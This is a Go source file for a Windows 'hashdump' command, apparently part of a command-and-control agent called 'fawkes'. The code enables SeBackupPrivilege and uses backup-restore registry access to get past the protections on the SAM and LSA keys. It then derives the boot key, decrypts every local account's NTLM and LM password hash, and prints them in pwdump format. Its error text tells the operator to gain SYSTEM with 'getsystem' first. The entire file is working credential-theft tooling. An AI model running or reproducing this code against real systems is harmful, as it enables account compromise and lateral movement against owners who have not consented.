//go:build windows
// +build windows

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"unicode/utf16"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32HD           = windows.NewLazySystemDLL("advapi32.dll")
	procRegCreateKeyExW  = advapi32HD.NewProc("RegCreateKeyExW")
	procRegQueryInfoKeyW = advapi32HD.NewProc("RegQueryInfoKeyW")
	procRegQueryValueExW = advapi32HD.NewProc("RegQueryValueExW")
	procRegEnumKeyExW    = advapi32HD.NewProc("RegEnumKeyExW")
	procRegCloseKey      = advapi32HD.NewProc("RegCloseKey")
)

const (
	hkeyLocalMachine       = uintptr(0x80000002)
	regOptionBackupRestore = 0x00000004
)

// HashdumpCommand implements local SAM hash extraction
type HashdumpCommand struct{}

func (c *HashdumpCommand) Name() string {
	return "hashdump"
}

func (c *HashdumpCommand) Description() string {
	return "Extract local account NTLM hashes from the SAM database (requires SYSTEM privileges)"
}

type hashdumpArgs struct {
	Format string `json:"format"`
}

func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
	var args hashdumpArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Enable SeBackupPrivilege on both process and thread tokens
	// Thread token is needed when impersonating SYSTEM via getsystem
	enableBackupPrivilege()
	enableThreadBackupPrivilege()

	// Step 1: Extract boot key from SYSTEM hive
	bootKey, err := extractBootKey()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Step 2: Read SAM F value and derive hashed boot key
	hashedBootKey, samRevision, err := deriveHashedBootKey(bootKey)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to derive hashed boot key: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Step 3: Enumerate user accounts and extract hashes
	users, err := enumerateAndDecryptUsers(hashedBootKey, samRevision)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to enumerate users: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(users) == 0 {
		return structs.CommandResult{
			Output:    "No user accounts found in SAM database.",
			Status:    "error",
			Completed: true,
		}
	}

	// Format output
	var sb strings.Builder
	for _, u := range users {
		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

type userHash struct {
	username string
	rid      uint32
	lmHash   string
	ntHash   string
}

// Constants for SAM hash decryption
var (
	samQWERTY    = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
	samDIGITS    = []byte("0123456789012345678901234567890123456789\x00")
	samNTPASSWD  = []byte("NTPASSWORD\x00")
	samLMPASSWD  = []byte("LMPASSWORD\x00")
	emptyLMHash  = "aad3b435b51404eeaad3b435b51404ee"
	emptyNTHash  = "31d6cfe0d16ae931b73c59d7e0c089c0"
)

// Boot key permutation table
var bootKeyPerm = []int{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}

// regOpenKey opens a registry key using RegCreateKeyExW with REG_OPTION_BACKUP_RESTORE.
// This bypasses DACLs on restricted keys (like SAM) when SeBackupPrivilege is held.
func regOpenKey(root uintptr, path string) (uintptr, error) {
	pathPtr, _ := windows.UTF16PtrFromString(path)
	var hKey uintptr
	var disposition uint32
	ret, _, err := procRegCreateKeyExW.Call(
		root,
		uintptr(unsafe.Pointer(pathPtr)),
		0, // Reserved
		0, // Class (nil)
		regOptionBackupRestore,
		uintptr(windows.KEY_READ),
		0, // Security attributes (nil)
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(&disposition)),
	)
	if ret != 0 {
		return 0, fmt.Errorf("RegCreateKeyExW(%s): %v (code %d)", path, err, ret)
	}
	return hKey, nil
}

// regCloseKey closes a registry key handle
func regCloseKey(hKey uintptr) {
	procRegCloseKey.Call(hKey)
}

// regQueryClassName reads the class name of a registry key
func regQueryClassName(hKey uintptr) (string, error) {
	classNameBuf := make([]uint16, 256)
	classNameLen := uint32(256)
	ret, _, err := procRegQueryInfoKeyW.Call(
		hKey,
		uintptr(unsafe.Pointer(&classNameBuf[0])),
		uintptr(unsafe.Pointer(&classNameLen)),
		0, 0, 0, 0, 0, 0, 0, 0, 0,
	)
	if ret != 0 {
		return "", fmt.Errorf("RegQueryInfoKeyW: %v (code %d)", err, ret)
	}
	return windows.UTF16ToString(classNameBuf[:classNameLen]), nil
}

// regQueryValue reads a registry value
func regQueryValue(hKey uintptr, valueName string) ([]byte, error) {
	var namePtr *uint16
	if valueName != "" {
		namePtr, _ = windows.UTF16PtrFromString(valueName)
	}

	// First call to get size
	var dataSize uint32
	ret, _, _ := procRegQueryValueExW.Call(
		hKey,
		uintptr(unsafe.Pointer(namePtr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&dataSize)),
	)
	if ret != 0 || dataSize == 0 {
		return nil, fmt.Errorf("RegQueryValueExW size query failed (code %d)", ret)
	}

	// Second call to get data
	data := make([]byte, dataSize)
	ret, _, err := procRegQueryValueExW.Call(
		hKey,
		uintptr(unsafe.Pointer(namePtr)),
		0, 0,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(unsafe.Pointer(&dataSize)),
	)
	if ret != 0 {
		return nil, fmt.Errorf("RegQueryValueExW: %v (code %d)", err, ret)
	}
	return data[:dataSize], nil
}

// regEnumSubkeys enumerates subkeys of a registry key
func regEnumSubkeys(hKey uintptr) ([]string, error) {
	var subkeys []string
	for i := uint32(0); ; i++ {
		nameBuf := make([]uint16, 256)
		nameLen := uint32(256)
		ret, _, _ := procRegEnumKeyExW.Call(
			hKey,
			uintptr(i),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
			0, 0, 0, 0,
		)
		if ret != 0 {
			break // ERROR_NO_MORE_ITEMS or other error
		}
		subkeys = append(subkeys, windows.UTF16ToString(nameBuf[:nameLen]))
	}
	return subkeys, nil
}

// extractBootKey reads the 4 LSA subkey class names and derives the boot key
func extractBootKey() ([]byte, error) {
	lsaKeys := []string{"JD", "Skew1", "GBG", "Data"}
	var scrambled []byte

	for _, keyName := range lsaKeys {
		path := fmt.Sprintf(`SYSTEM\CurrentControlSet\Control\Lsa\%s`, keyName)
		hKey, err := regOpenKey(hkeyLocalMachine, path)
		if err != nil {
			return nil, fmt.Errorf("open %s: %v", keyName, err)
		}
		className, err := regQueryClassName(hKey)
		regCloseKey(hKey)
		if err != nil {
			return nil, fmt.Errorf("class name %s: %v", keyName, err)
		}
		decoded, err := hex.DecodeString(className)
		if err != nil {
			return nil, fmt.Errorf("decode %s class '%s': %v", keyName, className, err)
		}
		scrambled = append(scrambled, decoded...)
	}

	if len(scrambled) != 16 {
		return nil, fmt.Errorf("boot key scrambled length %d, expected 16", len(scrambled))
	}

	// Apply permutation
	bootKey := make([]byte, 16)
	for i := 0; i < 16; i++ {
		bootKey[i] = scrambled[bootKeyPerm[i]]
	}
	return bootKey, nil
}

// deriveHashedBootKey reads SAM F value and derives the hashed boot key
func deriveHashedBootKey(bootKey []byte) ([]byte, byte, error) {
	hKey, err := regOpenKey(hkeyLocalMachine, `SAM\SAM\Domains\Account`)
	if err != nil {
		return nil, 0, fmt.Errorf("open SAM Account: %v", err)
	}
	defer regCloseKey(hKey)

	fValue, err := regQueryValue(hKey, "F")
	if err != nil {
		return nil, 0, fmt.Errorf("read F value: %v", err)
	}

	if len(fValue) < 0x70 {
		return nil, 0, fmt.Errorf("F value too short (%d bytes)", len(fValue))
	}

	// Key0 starts at offset 0x68
	samRevision := fValue[0x68]

	switch samRevision {
	case 0x01:
		return deriveHashedBootKeyRC4(fValue, bootKey)
	case 0x02:
		return deriveHashedBootKeyAES(fValue, bootKey)
	default:
		return nil, 0, fmt.Errorf("unknown SAM key revision: 0x%02x", samRevision)
	}
}

func deriveHashedBootKeyRC4(fValue, bootKey []byte) ([]byte, byte, error) {
	// SAM_KEY_DATA at offset 0x68: revision(4) + length(4) + salt(16) + key(16) + checksum(16)
	if len(fValue) < 0x68+0x38 {
		return nil, 0, fmt.Errorf("F value too short for RC4 key data")
	}

	salt := fValue[0x70:0x80]       // offset 0x68 + 8 = 0x70
	encKey := fValue[0x80:0x90]     // offset 0x68 + 0x18 = 0x80
	encChecksum := fValue[0x90:0xA0] // offset 0x68 + 0x28 = 0x90

	// Derive RC4 key: MD5(salt + QWERTY + bootKey + DIGITS)
	h := md5.New()
	h.Write(salt)
	h.Write(samQWERTY)
	h.Write(bootKey)
	h.Write(samDIGITS)
	rc4Key := h.Sum(nil)

	// RC4 decrypt key + checksum
	c, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil, 0, fmt.Errorf("RC4 init: %v", err)
	}
	combined := make([]byte, 32)
	copy(combined[:16], encKey)
	copy(combined[16:], encChecksum)
	c.XORKeyStream(combined, combined)

	hashedBootKey := combined[:16]
	checksum := combined[16:]

	// Verify checksum: MD5(hashedBootKey + DIGITS + hashedBootKey + QWERTY)
	h2 := md5.New()
	h2.Write(hashedBootKey)
	h2.Write(samDIGITS)
	h2.Write(hashedBootKey)
	h2.Write(samQWERTY)
	expected := h2.Sum(nil)

	for i := 0; i < 16; i++ {
		if checksum[i] != expected[i] {
			return nil, 0, fmt.Errorf("hashed boot key checksum mismatch")
		}
	}

	return hashedBootKey, 0x01, nil
}

func deriveHashedBootKeyAES(fValue, bootKey []byte) ([]byte, byte, error) {
	// SAM_KEY_DATA_AES at offset 0x68: revision(4) + length(4) + checksumLen(4) + dataLen(4) + salt(16) + data(varies)
	if len(fValue) < 0x68+0x20 {
		return nil, 0, fmt.Errorf("F value too short for AES key data")
	}

	dataLen := binary.LittleEndian.Uint32(fValue[0x74:0x78]) // offset 0x68 + 0x0C
	salt := fValue[0x78:0x88]                                 // offset 0x68 + 0x10
	encData := fValue[0x88 : 0x88+dataLen]                    // offset 0x68 + 0x20

	if len(encData) < 16 || len(encData)%aes.BlockSize != 0 {
		// Pad to block size if needed
		padded := make([]byte, ((len(encData)+aes.BlockSize-1)/aes.BlockSize)*aes.BlockSize)
		copy(padded, encData)
		encData = padded
	}

	// AES-128-CBC decrypt
	block, err := aes.NewCipher(bootKey)
	if err != nil {
		return nil, 0, fmt.Errorf("AES init: %v", err)
	}
	mode := cipher.NewCBCDecrypter(block, salt)
	decrypted := make([]byte, len(encData))
	mode.CryptBlocks(decrypted, encData)

	return decrypted[:16], 0x02, nil
}

// enumerateAndDecryptUsers reads all user accounts from SAM and decrypts their hashes
func enumerateAndDecryptUsers(hashedBootKey []byte, samRevision byte) ([]userHash, error) {
	usersPath := `SAM\SAM\Domains\Account\Users`
	hUsersKey, err := regOpenKey(hkeyLocalMachine, usersPath)
	if err != nil {
		return nil, fmt.Errorf("open Users key: %v", err)
	}
	defer regCloseKey(hUsersKey)

	subkeys, err := regEnumSubkeys(hUsersKey)
	if err != nil {
		return nil, fmt.Errorf("enum subkeys: %v", err)
	}

	var users []userHash
	for _, sk := range subkeys {
		if strings.EqualFold(sk, "Names") {
			continue
		}

		// Parse RID from hex subkey name
		rid64, err := parseHexUint32(sk)
		if err != nil {
			continue
		}
		rid := uint32(rid64)

		userPath := fmt.Sprintf(`%s\%s`, usersPath, sk)
		hUserKey, err := regOpenKey(hkeyLocalMachine, userPath)
		if err != nil {
			continue
		}

		vValue, err := regQueryValue(hUserKey, "V")
		regCloseKey(hUserKey)
		if err != nil {
			continue
		}

		u, err := parseUserVValue(vValue, rid, hashedBootKey, samRevision)
		if err != nil {
			continue
		}
		users = append(users, *u)
	}

	return users, nil
}

func parseHexUint32(s string) (uint32, error) {
	var val uint32
	_, err := fmt.Sscanf(s, "%x", &val)
	return val, err
}

func parseUserVValue(v []byte, rid uint32, hashedBootKey []byte, samRevision byte) (*userHash, error) {
	if len(v) < 0xCC+4 {
		return nil, fmt.Errorf("V value too short")
	}

	// Read username
	nameOffset := binary.LittleEndian.Uint32(v[0x0C:0x10]) + 0xCC
	nameLength := binary.LittleEndian.Uint32(v[0x10:0x14])
	if nameOffset+nameLength > uint32(len(v)) {
		return nil, fmt.Errorf("name offset out of bounds")
	}
	username := utf16LEToString(v[nameOffset : nameOffset+nameLength])

	// Read NT hash
	ntHashOffset := binary.LittleEndian.Uint32(v[0xA8:0xAC]) + 0xCC
	ntHashLength := binary.LittleEndian.Uint32(v[0xAC:0xB0])

	// Read LM hash
	lmHashOffset := binary.LittleEndian.Uint32(v[0x9C:0xA0]) + 0xCC
	lmHashLength := binary.LittleEndian.Uint32(v[0xA0:0xA4])

	// Decrypt NT hash
	ntHash := emptyNTHash
	if ntHashLength > 4 && ntHashOffset+ntHashLength <= uint32(len(v)) {
		hashData := v[ntHashOffset : ntHashOffset+ntHashLength]
		decrypted, err := decryptSAMHash(hashData, rid, hashedBootKey, samNTPASSWD, samRevision)
		if err == nil {
			ntHash = hex.EncodeToString(decrypted)
		}
	}

	// Decrypt LM hash
	lmHash := emptyLMHash
	if lmHashLength > 4 && lmHashOffset+lmHashLength <= uint32(len(v)) {
		hashData := v[lmHashOffset : lmHashOffset+lmHashLength]
		decrypted, err := decryptSAMHash(hashData, rid, hashedBootKey, samLMPASSWD, samRevision)
		if err == nil {
			lmHash = hex.EncodeToString(decrypted)
		}
	}

	return &userHash{
		username: username,
		rid:      rid,
		lmHash:   lmHash,
		ntHash:   ntHash,
	}, nil
}

func decryptSAMHash(hashData []byte, rid uint32, hashedBootKey, hashType []byte, samRevision byte) ([]byte, error) {
	if samRevision == 0x02 {
		return decryptSAMHashAES(hashData, rid, hashedBootKey)
	}
	return decryptSAMHashRC4(hashData, rid, hashedBootKey, hashType)
}

func decryptSAMHashRC4(hashData []byte, rid uint32, hashedBootKey, hashType []byte) ([]byte, error) {
	// SAM_HASH: pekID(2) + revision(2) + hash(16)
	if len(hashData) < 20 {
		return nil, fmt.Errorf("hash data too short for RC4 (%d)", len(hashData))
	}
	encHash := hashData[4:20]

	// Derive RC4 key: MD5(hashedBootKey + RID + hashType)
	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	h := md5.New()
	h.Write(hashedBootKey)
	h.Write(ridBytes)
	h.Write(hashType)
	rc4Key := h.Sum(nil)

	c, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil, err
	}
	desEncrypted := make([]byte, 16)
	c.XORKeyStream(desEncrypted, encHash)

	return decryptDESHash(desEncrypted, rid)
}

func decryptSAMHashAES(hashData []byte, rid uint32, hashedBootKey []byte) ([]byte, error) {
	// SAM_HASH_AES: pekID(2) + revision(2) + dataOffset(4) + salt(16) + hash(32+)
	if len(hashData) < 0x28 {
		return nil, fmt.Errorf("hash data too short for AES (%d)", len(hashData))
	}

	salt := hashData[0x08:0x18]
	encHash := hashData[0x18:]

	// Need at least 16 bytes of encrypted data (1 AES block)
	if len(encHash) < 16 {
		return nil, fmt.Errorf("encrypted hash too short")
	}

	// Ensure data is block-aligned
	dataLen := len(encHash)
	if dataLen%aes.BlockSize != 0 {
		aligned := make([]byte, ((dataLen+aes.BlockSize-1)/aes.BlockSize)*aes.BlockSize)
		copy(aligned, encHash)
		encHash = aligned
	}

	block, err := aes.NewCipher(hashedBootKey)
	if err != nil {
		return nil, err
	}
	mode := cipher.NewCBCDecrypter(block, salt)
	decrypted := make([]byte, len(encHash))
	mode.CryptBlocks(decrypted, encHash)

	return decryptDESHash(decrypted[:16], rid)
}

// decryptDESHash applies the final DES decryption using the RID-derived keys
func decryptDESHash(desEncrypted []byte, rid uint32) ([]byte, error) {
	if len(desEncrypted) < 16 {
		return nil, fmt.Errorf("DES encrypted data too short")
	}

	key1, key2 := desKeysFromRID(rid)

	block1, err := des.NewCipher(key1)
	if err != nil {
		return nil, err
	}
	block2, err := des.NewCipher(key2)
	if err != nil {
		return nil, err
	}

	plainHash := make([]byte, 16)
	block1.Decrypt(plainHash[:8], desEncrypted[:8])
	block2.Decrypt(plainHash[8:], desEncrypted[8:16])

	return plainHash, nil
}

// desKeysFromRID derives two DES keys from the RID
func desKeysFromRID(rid uint32) ([]byte, []byte) {
	k := make([]byte, 4)
	binary.LittleEndian.PutUint32(k, rid)

	key1in := []byte{k[0], k[1], k[2], k[3], k[0], k[1], k[2]}
	key2in := []byte{k[3], k[0], k[1], k[2], k[3], k[0], k[1]}

	return expandDESKey(key1in), expandDESKey(key2in)
}

// expandDESKey expands a 7-byte key to an 8-byte DES key with parity
func expandDESKey(in []byte) []byte {
	out := make([]byte, 8)
	out[0] = in[0] >> 1
	out[1] = ((in[0] & 0x01) << 6) | (in[1] >> 2)
	out[2] = ((in[1] & 0x03) << 5) | (in[2] >> 3)
	out[3] = ((in[2] & 0x07) << 4) | (in[3] >> 4)
	out[4] = ((in[3] & 0x0F) << 3) | (in[4] >> 5)
	out[5] = ((in[4] & 0x1F) << 2) | (in[5] >> 6)
	out[6] = ((in[5] & 0x3F) << 1) | (in[6] >> 7)
	out[7] = in[6] & 0x7F
	for i := 0; i < 8; i++ {
		out[i] = (out[i] << 1) & 0xFE
	}
	return out
}

// utf16LEToString converts a UTF-16LE byte slice to a Go string
func utf16LEToString(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return string(utf16.Decode(u16))
}

// enableBackupPrivilege enables SeBackupPrivilege on the current process token
func enableBackupPrivilege() error {
	var token windows.Token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
	if err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}

// enableThreadBackupPrivilege enables SeBackupPrivilege on the current thread's
// impersonation token (needed when running under getsystem)
func enableThreadBackupPrivilege() error {
	var token windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeBackupPrivilege"), &luid)
	if err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}
